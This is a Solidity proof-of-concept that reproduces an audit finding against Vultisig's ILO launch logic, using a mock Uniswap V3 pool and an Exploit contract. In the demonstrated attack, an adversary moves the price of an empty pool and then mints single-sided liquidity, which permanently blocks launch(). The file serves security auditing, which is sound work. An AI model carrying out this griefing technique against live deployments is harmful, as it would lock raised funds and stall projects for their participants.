// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Vultisig — adversary can prevent the launch of any ILO pool with enough
    raised capital, at any moment, by providing single-sided liquidity
    Finding 35755 (nnez, Code4rena 2024-06-vultisig) — HIGH (H-03)

    Root cause: ILOManager.launch() requires the Uniswap V3 pool's CURRENT
    sqrtPriceX96 to exactly equal the price cached at project-init time.
    Before the ILO's own liquidity is added, the pool has NO liquidity, so
    ANY address can move its price to anything, at zero cost, with a single
    swap. Worse, an attacker can then mint SINGLE-SIDED liquidity (supplying
    only the token on one side of the manipulated price) in a tick range
    that straddles the manipulated price and the cached target price. That
    liquidity makes swapping the price back require paying in the OTHER
    token -- normally the sale token, which should not be circulating
    before launch -- so the "obvious" mitigation (swap back to the cached
    price) becomes impossible. `launch()` then reverts with "UV3P" forever,
    even after the ILO has fully raised its target capital.

    This file is a self-contained, cheatcode-free reduction. `launch()`'s
    price-equality check is preserved verbatim (the `@>` line), from
    code-423n4/2024-06-vultisig commit befb1b1, src/ILOManager.sol L187-L190.
    The real Uniswap V3 pool (tick math, concentrated liquidity, swap
    accounting) is replaced with a minimal mock that preserves exactly the
    two behaviors the bug needs: (1) a fresh, liquidity-less pool's price is
    freely swappable at zero cost, and (2) minting single-sided liquidity in
    the right range blocks any swap attempting to cross back through it.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal mock of a Uniswap V3 pool, exposing only the surface
///      ILOManager.launch() and the manipulation/mitigation swaps touch.
contract MockUniV3Pool {
    uint160 public sqrtPriceX96;
    bool public blocked; // true once single-sided liquidity has been minted

    error IIA(); // Insufficient Input Amount -- matches Uniswap's real revert
    // reason when a swap-back would require a token the caller never supplied.

    constructor(uint160 initialPrice) {
        sqrtPriceX96 = initialPrice;
    }

    function slot0() external view returns (uint160, int24, uint16, uint16, uint16, uint8, bool) {
        return (sqrtPriceX96, 0, 0, 0, 0, 0, false);
    }

    /// @dev Before any liquidity exists in the pool, a swap of ANY size moves
    ///      the price to `sqrtPriceLimitX96` at ZERO cost -- exactly the
    ///      precondition the finding exploits ("price can be manipulated in
    ///      Uniswap v3 Pools when there is no liquidity in it via a swap with
    ///      no cost"). Once single-sided liquidity has been minted (`blocked`),
    ///      any further swap that would need to move price back through that
    ///      liquidity reverts, because it would require paying in a token the
    ///      caller does not have (`IIA`, matching the real Uniswap revert).
    function swap(address, bool, int256, uint160 sqrtPriceLimitX96, bytes calldata) external returns (int256, int256) {
        if (blocked) revert IIA();
        sqrtPriceX96 = sqrtPriceLimitX96;
        return (0, 0);
    }

    /// @dev Minting SINGLE-SIDED liquidity (a real ability of concentrated
    ///      liquidity pools when the chosen tick range lies entirely on one
    ///      side of the current price) permanently blocks any swap-back that
    ///      would cross through that range, because it would require the
    ///      caller to supply the sale token -- which should not be
    ///      circulating before launch.
    function mint(address, int24, int24, uint128, bytes calldata) external {
        blocked = true;
    }
}

/// @notice Reduced ILOManager. Only the price-equality launch gate is kept;
///         the pool-initialization/project bookkeeping around it (irrelevant
///         to this bug) is collapsed into simple mappings.
contract ILOManager {
    mapping(address => uint160) public cachedInitialPoolPriceX96;
    mapping(address => uint256) public launchTime;

    function initProject(address pool, uint160 initialPrice, uint256 _launchTime) external {
        cachedInitialPoolPriceX96[pool] = initialPrice;
        launchTime[pool] = _launchTime;
    }

    /// @dev Verbatim from `ILOManager.launch`, code-423n4/2024-06-vultisig
    ///      commit befb1b1, src/ILOManager.sol L187-L190 (the loop launching
    ///      each ILOPool that follows is dropped as irrelevant to this bug --
    ///      it never runs because this require reverts first).
    function launch(address uniV3PoolAddress) external {
        require(block.timestamp > launchTime[uniV3PoolAddress], "LT");
        (uint160 sqrtPriceX96,,,,,,) = MockUniV3Pool(uniV3PoolAddress).slot0();
        // @> VULN: requires the pool's CURRENT price to exactly equal the price
        // cached at project-init time. Anyone can move the current price for
        // free (empty pool) and permanently block it from being moved back
        // (single-sided liquidity) -- launch can never succeed again.
        require(cachedInitialPoolPriceX96[uniV3PoolAddress] == sqrtPriceX96, "UV3P");
    }
}

contract Exploit {
    MockUniV3Pool public pool; // CREATE nonce 1
    ILOManager public manager; // CREATE nonce 2

    uint160 public constant INITIAL_PRICE = 79228162514264337593543950336; // 2^96, price = 1
    uint160 public constant MIN_PRICE = 4295128740; // MIN_SQRT_RATIO + 1

    bool public mitigationWorkedBeforeAttack;
    bool public mitigationFailedAfterAttack;
    bool public launchPermanentlyBlocked;

    constructor() {
        pool = new MockUniV3Pool(INITIAL_PRICE);
        manager = new ILOManager();
        // Project fully raised its target capital; launch window is already open.
        manager.initProject(address(pool), INITIAL_PRICE, 0);
    }

    function run() external {
        // --- Control: before any single-sided liquidity exists, price
        //     manipulation is trivially self-mitigated by swapping back. ---
        pool.swap(address(this), true, 1, MIN_PRICE, "");
        require(pool.sqrtPriceX96() == MIN_PRICE, "control setup: manipulation should have moved the price");
        pool.swap(address(this), false, 1, INITIAL_PRICE, "");
        mitigationWorkedBeforeAttack = (pool.sqrtPriceX96() == INITIAL_PRICE);
        require(mitigationWorkedBeforeAttack, "control failed: price should be freely restorable pre-attack");

        // --- Attack: manipulate the price again, for free, then mint
        //     single-sided liquidity in the range between the manipulated
        //     price and the cached target price. This is a completely
        //     ordinary, permissionless action -- costs the attacker nothing
        //     but 1 wei of the raise token. ---
        pool.swap(address(this), true, 1, MIN_PRICE, "");
        pool.mint(address(this), -10, 10, 1, "");

        // @> VULN triggered here (via ILOManager.launch below): the
        // "obvious" mitigation -- swap back to the cached initial price --
        // is now blocked, because doing so would require the sale token,
        // which the mitigator does not have.
        (bool mitigationOk,) =
            address(pool).call(abi.encodeWithSelector(MockUniV3Pool.swap.selector, address(this), false, int256(1), INITIAL_PRICE, ""));
        mitigationFailedAfterAttack = !mitigationOk;
        require(mitigationFailedAfterAttack, "harm not demonstrated: mitigation swap unexpectedly succeeded");
        require(pool.sqrtPriceX96() == MIN_PRICE, "harm not demonstrated: price was restored despite blocked mitigation");

        // Harm: the ILO fully raised its capital and is ready to launch --
        // but launch() permanently reverts because the current price can
        // never be brought back to the cached initial price.
        (bool launchOk,) = address(manager).call(abi.encodeWithSelector(ILOManager.launch.selector, address(pool)));
        launchPermanentlyBlocked = !launchOk;
        require(launchPermanentlyBlocked, "harm not demonstrated: launch unexpectedly succeeded");
    }
}
